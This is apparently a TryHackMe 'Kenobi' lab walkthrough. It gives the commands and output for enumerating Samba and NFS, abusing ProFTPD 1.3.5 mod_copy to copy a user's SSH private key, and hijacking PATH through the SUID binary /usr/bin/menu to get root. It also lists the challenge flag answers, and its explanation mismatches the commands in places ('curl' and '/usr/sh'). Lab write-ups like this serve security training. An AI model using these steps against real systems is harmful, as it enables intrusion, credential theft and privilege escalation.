
# THM : Kenobi

> Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 

https://tryhackme.com/room/kenobi


## [Task 1] Deploy the vulnerable machine 


```sh
export IP=10.10.173.73
```


### #2 Scan the machine with nmap, how many ports are open?

```sh
nmap -Pn -sV -vv -oN nmap.txt $IP
```

```sh
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack ProFTPD 1.3.5
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     syn-ack 2-4 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     syn-ack 2-3 (RPC #100227)
```

> Réponse: **7**

## [Task 2] Enumerating Samba for shares 

### #1 Using the nmap command above, how many shares have been found?

```sh
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP -oN nmap.shares.txt
```

```sh
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.173.73\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.173.73\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.173.73\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
```

> Réponse: **3**

### #2 list the files on the share. What is the file can you see?

```sh
smbclient //$IP/anonymous
```

> Réponse: **log.txt**

## #3 What port is FTP running on?

You can recursively download the SMB share too. Submit the username and password as nothing.

```sh
smbget -R smb://$IP/anonymous
```

Open the file on the share. There is a few interesting things found.
* Information generated for Kenobi when generating an SSH key for the user
* Information about the ProFTPD server.

What port is FTP running on?

> Réponse: **21**

## #4 What mount can we see?

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just an server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```sh
nmap -p 111 -vv --script=nfs-ls,nfs-statfs,nfs-showmount -oN nmap.nfs.txt $IP
```

```sh
ORT    STATE SERVICE REASON
111/tcp open  rpcbind syn-ack
| nfs-showmount: 
|_  /var *
```

What mount can we see?

> Réponse: **/var**


## [Task 3] Gain initial access with ProFtpd 

> ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

### #1 	What is the version of ProFtpd?

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

```sh
ftp $IP
Connected to 10.10.173.73.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.173.73]
```

What is the version?

> Réponse: **1.3.5**

### #2 How many exploits are there for the ProFTPd running?	

We can use searchsploit to find exploits for a particular software version.

Searchsploit is basically just a command line search tool for exploit-db.com.

How many exploits are there for the ProFTPd running?

```sh
searchsploit proftpd 1.3.5
---------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                              |  Path
                                                                                                                            | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                   | exploits/linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                         | exploits/linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                   | exploits/linux/remote/36742.txt
---------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
```
> Réponse: **3**


### #3 You should have found an exploit from ProFtpd's mod_copy module. 

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. 

```sh
nc $IP 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.173.73]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/kenobi_id_rsa
250 Copy successful
QUIT
221 Goodbye.
```

### #4 Lets mount the /var/tmp directory to our machine

```sh
sudo mkdir /mnt/kenobiNFS
sudo mount $IP:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

What is Kenobi's user flag (/home/kenobi/user.txt)?

> Réponse: **d0b0f3f53b6caa532a83915e19224899**

## [Task 4] Privilege Escalation with Path Variable Manipulation 

### #1 Search for SUID 
> SUID Bit => User executes the file with permissions of the file owner

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

```sh
find / -perm -u=s -type f 2>/dev/null
``` 

```sh
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

What file looks particularly out of the ordinary? 

> Réponse: **/usr/bin/menu**

### #2 Run the binary, how many options appear?

> Réponse: **3**

### #3 Strings is a command on Linux that looks for human readable strings on a binary.

```sh
strings /usr/bin/menu
```

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

```sh

kenobi@kenobi:/dev/shm$ echo /bin/bash > uname
kenobi@kenobi:/dev/shm$ chmod 777 uname 
kenobi@kenobi:/dev/shm$ export PATH=/dev/shm:$PATH

kenobi@kenobi:/dev/shm$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :2
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/dev/shm# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
root@kenobi:/dev/shm# cat /root/root.txt 
177b3cd8562289f37382721c28381f02

```

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!


### #4 What is the root flag (/root/root.txt)?

> Réponse: 
